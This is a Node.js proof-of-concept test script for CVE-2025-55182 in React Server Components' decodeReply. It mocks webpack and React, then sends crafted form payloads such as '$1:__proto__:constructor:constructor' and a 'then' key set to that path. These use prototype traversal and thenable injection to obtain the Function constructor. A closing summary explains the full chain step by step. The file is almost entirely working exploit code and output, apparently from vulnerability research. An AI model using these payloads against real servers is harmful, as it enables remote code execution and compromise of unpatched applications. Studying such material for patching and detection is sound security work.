/**
 * Test: msanft's CVE-2025-55182 approach
 *
 * Uses $N:key:key:key syntax with __proto__ traversal and thenable injection
 *
 * Key differences from our previous approach:
 * - Uses colon-separated path: $1:__proto__:constructor:constructor
 * - Sets .then = Function constructor
 * - Exploits JavaScript's thenable detection when await is called
 */

'use strict';

// Setup webpack mock (minimal - just needs to return any object)
const webpackServerModules = {};
const webpackServerMap = {};

global.__webpack_chunk_load__ = id => Promise.resolve();
global.__webpack_require__ = id => webpackServerModules[id];

process.env.NODE_ENV = 'production';
require.cache[require.resolve('react')] = {
  id: require.resolve('react'),
  filename: require.resolve('react'),
  loaded: true,
  exports: {
    __SERVER_INTERNALS_DO_NOT_USE_OR_WARN_USERS_THEY_CANNOT_UPGRADE: { H: null, A: null },
    version: '19.0.0',
  }
};

const { decodeReply } = require('react-server-dom-webpack/server.node');

console.log('='.repeat(60));
console.log('Test: msanft CVE-2025-55182 approach');
console.log('='.repeat(60));
console.log('');

async function test1_ColonSyntax() {
  console.log('[TEST 1] Testing $N:key:key colon syntax...');
  console.log('');

  // Try the exact msanft payload
  const formData = new Map();
  formData.set('0', '["$1:__proto__:constructor:constructor"]');
  formData.set('1', '{"x":1}');

  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', result);
    console.log('  Type:', typeof result);
    if (Array.isArray(result)) {
      console.log('  result[0]:', result[0]);
      console.log('  result[0] type:', typeof result[0]);
      console.log('  result[0] === Function?', result[0] === Function);
    }
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');
}

async function test2_ThenableObject() {
  console.log('[TEST 2] Testing thenable object creation...');
  console.log('');

  // Create object where .then = Function constructor
  const formData = new Map();
  formData.set('0', '{"then":"$1:__proto__:constructor:constructor"}');
  formData.set('1', '{"x":1}');

  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Result:', result);
    console.log('  Type:', typeof result);
    console.log('  result.then:', result.then);
    console.log('  result.then type:', typeof result.then);
    console.log('  result.then === Function?', result.then === Function);

    if (result.then === Function) {
      console.log('');
      console.log('  SUCCESS! Got Function constructor as .then property');
      console.log('');
      console.log('  What happens when we await this object:');
      console.log('  - JavaScript detects .then property');
      console.log('  - Calls: result.then(resolve, reject)');
      console.log('  - Which is: Function(resolve, reject)');
      console.log('  - Creates new function with resolve/reject as param names!');

      // Test what Function receives when called as thenable
      console.log('');
      console.log('  Simulating thenable call...');

      const capturedArgs = [];
      const mockResolve = (v) => { capturedArgs.push({type: 'resolve', value: v}); };
      const mockReject = (v) => { capturedArgs.push({type: 'reject', value: v}); };

      const createdFn = result.then(mockResolve, mockReject);
      console.log('  Function(resolve, reject) created:', typeof createdFn);
      console.log('  Created function:', createdFn.toString().slice(0, 100));
    }
  } catch (e) {
    console.log('  Error:', e.message);
    console.log('  Stack:', e.stack);
  }
  console.log('');
}

async function test3_AwaitThenable() {
  console.log('[TEST 3] Testing actual await on thenable...');
  console.log('');

  const formData = new Map();
  formData.set('0', '{"then":"$1:__proto__:constructor:constructor"}');
  formData.set('1', '{"x":1}');

  formData.forEach = function(cb) {
    for (const [k, v] of this.entries()) cb(v, k);
  };

  try {
    const result = await decodeReply(formData, webpackServerMap);
    console.log('  Got thenable object');
    console.log('  result.then === Function?', result.then === Function);

    if (result.then === Function) {
      console.log('');
      console.log('  Now awaiting the thenable...');
      console.log('  (This calls Function(resolve, reject))');

      try {
        // This should call Function(resolve, reject)
        const awaited = await result;
        console.log('  Awaited result:', awaited);
      } catch (e) {
        console.log('  Await error:', e.message);
      }
    }
  } catch (e) {
    console.log('  Error:', e.message);
  }
  console.log('');
}

async function test4_CompareApproaches() {
  console.log('[TEST 4] Comparing __proto__ vs #constructor approaches...');
  console.log('');

  // Approach A: __proto__ traversal (msanft style)
  console.log('  [A] __proto__ traversal:');
  const formDataA = new Map();
  formDataA.set('0', '["$1:__proto__:constructor:constructor"]');
  formDataA.set('1', '{"x":1}');
  formDataA.forEach = function(cb) { for (const [k, v] of this.entries()) cb(v, k); };

  try {
    const resultA = await decodeReply(formDataA, webpackServerMap);
    console.log('      Result[0]:', resultA[0]);
    console.log('      Result[0] === Function?', resultA[0] === Function);
  } catch (e) {
    console.log('      Error:', e.message);
  }

  // Approach B: #constructor via $F (our previous style - needs server reference)
  console.log('');
  console.log('  [B] #constructor via $F reference (needs pre-registered module):');
  console.log('      (Skipping - requires serverManifest entry)');

  console.log('');
}

async function main() {
  await test1_ColonSyntax();
  await test2_ThenableObject();
  await test3_AwaitThenable();
  await test4_CompareApproaches();

  console.log('='.repeat(60));
  console.log('ANALYSIS');
  console.log('='.repeat(60));
  console.log('');
  console.log('The msanft approach uses:');
  console.log('  1. $N:key:key:key colon syntax for deep property access');
  console.log('  2. __proto__ traversal to reach Object.prototype');
  console.log('  3. constructor.constructor to get Function');
  console.log('  4. Sets .then = Function to create thenable');
  console.log('  5. When awaited: Function(resolve, reject) is called');
  console.log('');
  console.log('Key insight: Does NOT need pre-registered modules!');
  console.log('Just needs ANY object in the chunks to traverse from.');
  console.log('');
}

main().catch(console.error);
